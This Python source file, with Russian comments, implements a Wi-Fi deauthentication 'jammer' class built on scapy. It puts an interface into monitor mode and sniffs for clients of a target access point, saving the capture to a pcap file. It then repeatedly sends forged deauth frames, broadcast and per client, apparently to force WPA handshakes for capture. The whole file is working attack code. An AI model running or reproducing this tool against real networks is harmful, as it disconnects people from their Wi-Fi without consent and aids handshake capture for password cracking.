import threading
import time
import signal
from pynput import keyboard
from myLogs import Logging
import json
from dump import wifiDump as wd
from constants import *
from NA import NetworkAdapters as na
from dump import filter
from scapy.all import *
from scapy.layers.dot11 import  Dot11,Dot11Auth,Dot11Deauth,Dot11QoS,Dot11Elt,RadioTap,EAPOL


class deauth:
	"""Handshake, осуществлет перехват пакетов на беспроводном интерфейсе. Атрибуты:
	                           - iface (Интерфейс)
	                           - bssid
	                           - client (mac-адрес клиента)
	                           - count (количество повтраений отправки пакетов-deauth)
	                           - filter (правила фильтра)
	                           - client_list (вспомогательный список клиентов, подключенных к bssid )
	                           """
	def __init__(self,_iface=None,_bssid=None,_client=None,_count = 30):
		self.iface = _iface
		self.bssid = _bssid
		self.client = _client
		self.count = _count
		self.client_list = []
		self.log = Logging(LOGS_DIR + 'main.log')
		self.state = STATES_DIR + 'jummer.state'
		self.out = LOGS_DIR + 'jummer.output'

		na.set_mode(_iface, 'monitor')
		print(na.get_mode(_iface))

	def write_to_file(self, file_name, line):
		f = open(file_name, 'a')
		f.writelines(line)
		f.close()

	# Формирование и отправка пакетов деаунтификации дл всех клиентов подключенных к некоторому bssid
	def deauth_all(self):
		dic = {}
		global cicl
		if self.count == 0:
			cicl = 40
		else:
			cicl = self.count
		radio = b'\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
		deauth = bytes(Dot11Deauth(reason=15))
		for iter in range(1, cicl):
			ap_mobile = radio + bytes(Dot11(type=0, subtype=12, ID=14849, addr1='ff:ff:ff:ff:ff:ff', addr2=self.bssid, addr3=self.bssid,SC=iter)/Dot11Deauth(reason=15))
			#tmp = bytes(Dot11(type=0, subtype=12, addr1='ff:ff:ff:ff:ff:ff', ID=14849, addr2=self.bssid, addr3=self.bssid))
			#dot11 = tmp[0:-2]
			#sn = (hex(iter) + '\x00').encode()
			dic['src_mac'] = self.bssid
			dic['dst_mac'] = 'ff:ff:ff:ff:ff:ff'
			dic['type'] = 'Deauth'
			dic['reason'] = 'Врем четырехстороннего рукопожати истекло'
			self.write_to_file(self.out, json.dumps(dic))

			#packet = radio + dot11 + sn + deauth
			sendp(ap_mobile, iface=self.iface, count=1, verbose=0)

	# Формирование и отправка пакетов деаунтификации дл клиента
	def deauth_client(self,client):
		dic = {}
		global cicl
		if self.count == 0:
			cicl = 50
		else:
			cicl = self.count
		radio = b'\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00'
		deauth = bytes(Dot11Deauth(reason=7))
		#ID=14849
		#SC=iter,
		for iter in range(1, cicl):
			ap = radio + bytes(Dot11(type=0, subtype=12,ID=14849, addr1=self.client,  addr2=self.bssid, addr3=self.bssid,SC=iter)) + \
				 bytes(Dot11Deauth(reason=7))
			dic['src_mac'] = self.bssid
			dic['dst_mac'] = self.client
			dic['type'] = 'Deauth'
			dic['reason'] = 'Не подключенный клиент пытаетс отправить данные'
			self.write_to_file(self.out, json.dumps(dic))
			cl = radio + bytes(Dot11(type=0, subtype=12,ID=14849, addr1=self.bssid, addr2=self.client, addr3=self.bssid,SC=iter+1)) + \
				 bytes(Dot11Deauth(reason=7))
			#tmp_cl = Dot11(type=0, subtype=12,ID=14849, addr1=self.bssid, addr2=self.client, addr3=self.bssid)
			#dot11_cl = tmp_cl[0:-2]
			#sn_cl = (hex(iter + 1) + '\x00').encode()
			#packet_cl = radio + dot11_cl + sn_cl + deauth
			sendp(ap, iface=self.iface, count=4, verbose=0)
			sendp(cl, iface=self.iface, count=4, verbose=0)


	# Метод обработки перехваченных пакетов
	def prnf(self, pkt):
		#print('i-am packet')
		if not self.event.is_set():
			raise KeyboardInterrupt
		if pkt.haslayer(Dot11Auth) or pkt.haslayer(EAPOL):
			if pkt.addr2 == self.bssid:
				if pkt.haslayer(Dot11QoS):
					if pkt.addr1 not in self.client_list:
						self.client_list.append(pkt.addr1)
				elif pkt.haslayer(EAPOL):
					if pkt.addr1 not in self.client_list:
						self.client_list.append(pkt.addr1)


	# Деаунтификаци клиента в потоке
	def client_thread(self):
		while self.event.is_set():
			self.deauth_client(self.client)
			if self.count != 0:
				self.event.clear()
				#raise KeyboardInterrupt

			self.on_exit()

			tmp_fl = open(self.state, 'r')
			jsn = json.load(tmp_fl)
			tmp_fl.close()
			if not jsn['running']:
				self.event.clear()
				#raise KeyboardInterrupt
		self.log.write_log('JAMMER', 'Деаунтификаци клиента: {} завершилась'.format(self.client))
		wd.begin_condition(self.iface)

	# Деаутинфикаци всех клиентов в потоке
	def all_thread(self):
		while self.event.is_set():
			self.deauth_all()

			time.sleep(2)
			if len(self.client_list) > 0:
				print(self.client_list)
				for clnt in self.client_list:
					self.deauth_client(clnt)

			if self.count != 0:
				self.event.clear()
				#raise KeyboardInterrupt

			#self.on_exit()

			tmp_fl = open(self.state, 'r')
			jsn = json.load(tmp_fl)
			tmp_fl.close()
			if not jsn['running']:
				self.event.clear()
				#raise KeyboardInterrupt
				self.log.write_log('JAMMER', 'Деаунтификаци клиентов точки доступа: {} завершилась'.format(self.bssid))
		wd.begin_condition(self.iface)

	# Метод отправлени пакетов-deauth
	def start(self):
		tmp_fl_out = open(self.out, 'w')
		tmp_fl_out.close()
		run = {}
		run['running'] = True
		fl_run = open(self.state, 'w')
		fl_run.writelines(json.dumps(run))
		fl_run.close()
		self.event = threading.Event()
		self.event.set()

		if not self.client is None:
			self.log.write_log('JAMMER','Деаунтификаци клиента: {} началась'.format(self.client))
			self.t0 = threading.Thread(None, self.client_thread)
			try:
				self.t0.start()
			except KeyboardInterrupt:
				self.event.clear()
				self.t0.join()
		else:
			self.log.write_log('JAMMER', 'Деаунтификаци клиентов точки доступа: {} началась'.format(self.bssid))
			self.t1 = threading.Thread(None, self.my_sniff)
			try:
				self.t1.start()
			except KeyboardInterrupt:
				self.event.clear()
				self.t1.join()

			self.t2 = threading.Thread(None, self.all_thread)
			try:
				self.t2.start()
			except KeyboardInterrupt:
				self.event.clear()
				self.t2.join()



	@staticmethod
	def on_exit():
		run = {}
		run['running'] = False
		fl_run = open(STATES_DIR + 'jummer.state', 'w')
		fl_run.writelines(json.dumps(run))
		fl_run.close()
		time.sleep(5)
		#wd.begin_condition(iface)

	# Метод дл перехвата пакетов, с целью установлени клиентов принадлежащих bssid
	def my_sniff(self):  # lambda x:x.haslayer(IP)
		print('my_sniff start!')
		pcap = sniff(iface=self.iface, prn=self.prnf, store=1,lfilter=filter.bssid(self.bssid))
		print('my_sniff stoped!')
		if len(pcap) > 0:
			wrpcap('dumps.cap', pcap)




#bssid = 'a4:2b:b0:e7:19:c0'
#tmp = deauth('wlan0',bssid,None,0)#'a8:a6:68:71:79:00')#'d4:a1:48:46:d2:a9''30:e3:7a:99:27:80'
#tmp.start()

#print('exit')
